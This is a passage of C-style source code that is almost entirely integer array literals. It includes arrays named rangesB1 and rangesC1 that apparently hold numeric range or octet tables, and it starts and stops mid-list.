178,182,183,184,185,186,19,190,191,2,216,223,228,230,233,234,235,251,3,36,48,5,52,53,54,6,7,75,76,77,78,79,8,80,82,83,85,86,90,94,122,140,141,148,16,162,165,168,176,183,209,210,211,219,221,244,251,28,29,33,42,90,94,98,112,144,145,150,151,156,157,158,233,234,237,238,105,137,139,144,145,183,19,206,32,50,51,6,7,8,80,81,93,102,110,114,116,118,119,120,123,124,125,126,132,158,183,46,86,108,134,166,167,253,43,50,80,92,93,100,101,102,103,110,128,129,130,132,133,134,158,16,164,165,166,167,17,3,33,63,75,113,24,45,56,63,16,169,40,43,1,164,165,17,198,244,245,27,43,76,10,210,0,1,11,2,211,3,45,82,85,9,94,141,151,31,108,111,122,123,124,157,158,208,209,210,211,221,222,225,232,233,234,235,236,238,239,240,242,252,253,254,34,35,39,40,41,45,48,50,51,66,69,71,78,81,82,85,89,93,94,10,11,111,130,132,137,139,146,148,15,151,153,154,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,20,25,26,28,29,36,37,38,40,56,8,80,83,84,85,92,97,105,106,107,111,115,118,119,12,122,126,127,129,13,132,133,135,136,140,142,149,16,163,164,165,169,17,170,176,177,179,18,180,181,184,185,186,187,188,19,190,191,20,21,22,23,232,24,25,26,27,30,31,32,33,35,36,37,40,41,42,43,44,45,46,47,49,50,51,52,53,54,55,56,69,73,77,79,26,116,117,119,120,125,13,14,15,150,178,179,180,181,182,183,184,188,191,229,234,242,244,245,249,250,252,254,27,29,33,38,41,44,54,74,78,80,82,83,84,85,91,96,162,163,164,165,170,178,192,193,200,21,213,214,215,218,23,248,27,29,30,35,4,82,83,91,102,114,127,140,144,147,149,151,166,176,178,200,205,207,208,209,222,48,49,50,51,52,53,54,55,56,57,58,59,60,61,76,77,78,79,80,81,0,1,10,11,12,132,14,143,144,147,15,172,174,183,20,208,209,21,216,22,220,221,229,23,233,234,235,239,24,240,244,25,26,27,28,29,30,31,4,45,5,6,66,69,7,8,9,99,101,124,192,193,195,196,198,2,22,220,232,236,237,238,240,47,51,53,54,94,95,100,101,102,103,104,105,106,107,108,109,110,113,114,133,136,14,15,154,159,16,172,173,174,175,178,186,187,192,194,198,204,229,233,237,238,243,250,64,70,71,9,90,94,95,96,97,98,99,102,104,105,107,121,122,124,125,34,41,43,51,57,63,0,1,10,101,103,107,11,110,117,119,120,121,13,14,15,154,16,17,18,187,19,2,20,205,21,216,225,239,244,248,251,253,3,4,5,6,7,8,9,92,96,97,98,102,135,145,147,148,149,156,200,201,204,208,210,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,28,29,30,31,86,105,109,110,120,122,134,135,138,139,142,144,147,151,165,169,173,175,177,178,18,189,200,205,21,212,214,215,218,219,22,221,225,231,232,237,239,24,240,248,249,253,254,32,33,34,37,40,41,42,43,44,47,71,121,122,14,15,150,151,154,157,162,177,179,18,188,189,64,102,109,122,123,124,135,140,143,144,148,149,158,185,189,190,193,195,200,201,202,203,210,211,214,215,218,219,221,222,224,225,228,231,232,233,234,235,236,237,238,240,241,242,243,244,247,250,72,80,93,97,98,10,100,101,112,113,114,124,125,126,127,15,16,18,19,243,245,249,25,252,26,37,38,39,40,41,44,45,46,50,54,6,62,7,8,88,100,102,103,107,110,114,117,118,119,120,122,123,124,126,127,147,148,150,151,155,159,172,178,179,181,182,183,184,185,190,222,62,63,67,69,72,74,79,80,88,90,92,101,102,120,121,122,123,124,137,138,141,154,156,158,176,178,179,180,181,182,183,188,19,190,196,20,204,21,224,226,227,230,231,232,233,241,242,244,245,248,25,253,28,29,31,32,34,36,37,38,39,40,41,46,50,51,70,75,76,77,78,97,10,104,105,106,107,110,111,12,124,125,126,127,129,13,132,133,134,135,139,14,143,15,152,154,158,160,163,165,173,175,179,180,181,188,189,190,191,210,211,218,220,221,227,232,233,234,235,236,237,238,239,242,244,245,246,247,248,249,250,251,252,27,28,30,32,33,35,37,38,46,47,48,49,5,50,51,52,53,54,55,57,59,6,65,67,68,69,7,70,71,72,73,76,77,78,79,8,81,82,83,84,86,87,9,93,94,10,30,43,56,8,85,76,124,175};
int rangesB1[] = {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,101,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,104,104,104,104,104,104,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,106,107,108,108,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,109,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,110,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,111,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,112,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,113,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,114,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,115,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,116,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,117,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,118,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,119,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,120,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,121,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,122,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,123,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,124,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,125,128,128,128,128,128,128,128,130,131,131,131,132,133,134,134,134,136,137,138,138,138,138,138,138,138,138,139,139,139,139,139,139,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,140,140,140,140,140,140,140,140,140,140,141,141,143,143,143,143,143,144,144,144,146,146,146,146,146,148,149,149,149,150,150,150,150,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,151,152,152,152,152,152,152,152,152,152,152,152,152,152,152,152,152,152,152,152,152,153,153,153,153,153,154,154,155,156,156,156,156,156,156,156,156,157,157,157,159,159,159,159,160,160,160,160,160,160,161,161,161,162,163,163,163,163,163,163,163,163,163,164,165,165,165,166,166,166,166,166,166,166,167,167,167,167,167,167,168,168,168,168,168,168,168,168,168,168,169,169,169,169,169,170,170,170,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,171,172,172,172,173,173,173,174,174,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,175,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,176,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,177,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,178,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,179,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,180,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,181,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,182,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,183,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,186,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,187,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,189,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,190,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,191,192,192,192,192,192,192,192,192,192,193,193,193,193,193,193,193,193,193,193,193,194,194,194,194,194,195,195,195,195,195,195,195,195,195,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,196,197,197,197,197,197,197,197,197,197,197,197,197,197,197,197,197,197,197,197,197,197,198,199,199,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,2,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,200,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,201,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,202,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,203,205,205,205,205,206,206,206,206,206,207,207,207,207,207,207,207,207,207,207,208,208,209,209,209,209,209,209,209,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,210,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,211,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,213,216,216,216,216,216,216,216,216,216,216,216,216,216,216,216,217,217,217,217,217,217,217,217,217,217,217,217,217,217,217,217,217,217,217,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,218,219,219,219,219,219,219,219,219,219,219,219,219,219,219,219,219,219,219,219,219,219,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,220,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,221,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,222,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,223,24,24,24,24,24,24,24,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,27,30,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,36,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,37,38,38,38,38,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,39,4,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,41,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,42,43,43,43,43,43,43,43,43,43,43,43,43,43,43,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,45,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,47,47,47,47,47,47,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,50,51,54,54,54,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,58,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,59,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,60,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,61,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,62,63,63,63,63,63,63,63,63,63,63,63,63,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,64,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,65,66,66,66,66,66,66,66,66,66,66,67,67,67,67,67,67,67,67,67,67,67,67,68,68,68,68,68,69,69,69,69,69,70,70,70,70,70,71,71,71,71,72,72,72,72,72,72,72,72,72,72,73,73,74,74,74,74,74,74,74,74,74,74,74,75,75,76,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,77,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,79,8,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,81,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,82,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,83,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,84,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,85,86,86,86,86,86,86,86,86,86,86,86,86,86,86,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,87,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,89,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,91,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,92,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,93,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,94,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,96,96,96,96,96,96,97,98,98};
int rangesC1[] = {1,1,101,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,103,109,109,111,112,115,118,118,118,118,118,118,120,121,122,122,122,122,124,124,125,125,125,128,131,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,167,173,175,175,176,176,178,179,180,181,182,182,182,182,182,182,182,182,186,186,186,186,186,186,186,186,186,186,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,188,189,189,189,190,196,202,202,202,202,202,202,202,202,202,203,203,210,211,211,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,212,213,216,220,220,27,27,27,27,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,31,37,37,37,37,37,37,37,41,41,41,41,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,43,45,45,45,45,45,45,45,45,45,45,45,45,45,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,49,49,49,49,49,49,49,49,49,49,5,5,5,5,5,5,5,5,5,50,50,59,59,59,59,61,61,61,61,61,61,62,77,77,77,77,77,77,77,77,77,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,78,